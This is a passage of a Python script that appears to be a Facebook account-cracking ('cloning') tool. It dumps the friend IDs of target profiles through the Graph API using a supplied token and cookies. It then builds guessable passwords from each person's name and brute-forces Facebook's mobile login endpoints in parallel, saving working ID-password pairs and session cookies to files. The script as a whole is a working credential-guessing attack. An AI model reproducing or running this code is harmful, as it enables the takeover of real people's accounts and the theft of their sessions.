        print('\x1b[38;5;50m==================')
        jum = int(input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] ENTER TARGET AMOUNT  : '))
        print('\x1b[38;5;50m==================')
    except ValueError:
        print('\x1b[38;5;50m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\x1b[38;5;50m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\x1b[38;5;50m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\x1b[38;5;50m==================')
        print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\x1b[38;5;50m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print(f'\033[38;5;196m───────────────────\033[1;37m')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mFILE NAME EXAMPLE: /sdcard/file.txt Etc.]')
    o = input('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mYOUR FILE NAME :\x1b[1;95m ')
    print(f'\033[38;5;196m───────────────────\033[1;37m')
    try:lin = open(o).read().splitlines()
    except:
        print(f'\033[38;5;196m───────────────────\033[1;37m')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print(f'\033[38;5;196m┏━───────────────────\033[1;37m')
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50mOLD ID")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mNEW ID")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[38;5;50mMIX ID [BEST]")
    print(f'\033[38;5;196m┗━───────────────────\033[1;37m')
    hu = input('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \033[1;96mCHOOSE :\x1b[38;5;50m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print(f'\033[38;5;196m┏━───────────────────\033[1;37m')
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50m COOKIES  [\x1b[1;95mBEST\x1b[38;5;50m]")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \x1b[38;5;50m CP ID [\x1b[38;5;50mBEST\x1b[38;5;50m]")
    print(f'\033[38;5;196m┗━───────────────\033[1;37m')
    hc = input('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE: ')
    #os.system("xdg-open https://www.facebom/ASHIK.King.Ok.Bro")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;50m┏━──────────────────────────────────────────────────\033[1;37m')
    print(f"\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97mYOUR TOOLS ACTIVE \x1b[38;5;50m[FREE] ") 
    print(f"\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97mUSER NAME\033[1;91m :\033[1;96m "+UNAME)
    print('\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[41m\x1b[1;97mYOUR TOTAL IDZ \033[0;97m:\x1b[38;5;50m ',str(len(id)))
   # print("\033[1;91m[\033[1;92m+\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    print(f'\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \x1b[38;5;46m\033[1;97m𝙵𝙰𝚂𝚃 \033[1;34m[\033[1;32m𝙽𝙾\033[1;97m/\033[38;5;196m𝙾𝙵𝙵\033[1;34m] \033[1;97m𝙰𝙸𝚁𝙿𝙻𝙰𝙽𝙴 𝙼𝙾𝙳𝙴] [💙] ')
    print(f'\x1b[38;5;50m┗━──────────────────────────────────────────────────\033[1;37m')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'4455')
                    pwv.append(frs+'00')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')
                    pwv.append(frs+'##')                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'4455')
                    pwv.append(frs+'00')                
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')
                    pwv.append(frs+'##')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(OK))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(CP))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    os.system("python ASHIK-6-3.py")
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,CP
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo}[MEHEDI-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',}
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMEHEDI-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMEHEDI-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🌺]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " MEHEDI,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[MEHEDI-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMEHEDI-Cp🖤\033[1;91m] {idf} • {pw}')
                print(f'\033[38;5;196m───────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MEHEDI-Ok💙] \033[1;92m{idf} • \033[1;92m{pw} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " MEHEDI,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()